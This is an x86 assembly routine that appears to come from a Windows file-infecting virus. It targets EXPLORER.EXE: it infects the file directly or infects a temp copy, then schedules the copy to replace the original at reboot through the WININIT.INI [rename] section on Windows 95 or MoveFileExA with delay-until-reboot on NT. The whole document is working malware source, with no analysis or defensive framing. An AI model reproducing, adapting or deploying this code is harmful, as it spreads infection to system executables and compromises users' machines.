
process_explorer        proc    pascal
                        local   file_src:BYTE:512 ; EXPLORER.EXE
                        local   file_dst:BYTE:512 ; tempfile
                        local   file_wii:BYTE:512 ; WININIT.INI (md9X)
                        local   renamestr:BYTE:32 ; [rename]
                        pusha
                        cld

include                 INCLUDE\philez3.inc

                        lea     edx, file_src
                        call    infect_exe_file

                        test    al, IX_TIMESIGN+IX_INFECTED ; infected ?
                        jnz     __exit

                        lea     eax, file_dst
                        lea     ebx, file_src

                        debugmsg copyfile1, ebx
                        debugmsg copyfile2, eax

                        debugskip explcont, __exit

                        push    0
                        push    eax
                        push    ebx
                        call    xxCopyFileA

                        or      eax, eax
                        jz      __exit

                        lea     edx, file_dst
                        call    infect_exe_file

                        test    al, IX_INFECTED
                        jz      __error

IFDEF   USE_NT
                        call    xxGetVersion
                        shl     eax, 1
                        jnc     __winnt
ENDIF

__win95:

                        lea     eax, file_wii
                        push    eax
                        lea     eax, file_dst
                        push    eax
                        lea     eax, file_src
                        push    eax
                        lea     eax, renamestr
                        push    eax
                        call    xxWritePrivateProfileStringA

                        jmp     __exit

IFDEF   USE_NT
__winnt:
                        call    get_ex_base         ; EBX/ECX

                        mov_h   edi, MoveFileExA
                        call    findfunc
                        jz      __exit
                        xchg    esi, eax

                        push    4 ; delay_until_reboot
                        push    0
                        lea     ecx, file_src
                        push    ecx
                        call    esi

                        lea     ecx, file_src
                        lea     edx, file_dst

                        debugmsg movefilex1, ecx
                        debugmsg movefilex2, edx

                        push    4 ; delay_until_reboot
                        push    ecx
                        push    edx
                        call    esi
ENDIF

__exit:                 popa
                        ret

__error:                lea     eax, file_dst

                        debugmsg delfile, eax

                        push    eax
                        call    xxDeleteFileA

                        jmp     __exit

__windir:               push    512
                        push    edi
                        call    xxGetWindowsDirectoryA
                        add     edi, eax
                        retn

__copystr:              lodsb
                        stosb
                        or      al, al
                        jnz     __copystr
                        dec     edi
                        retn

                        endp

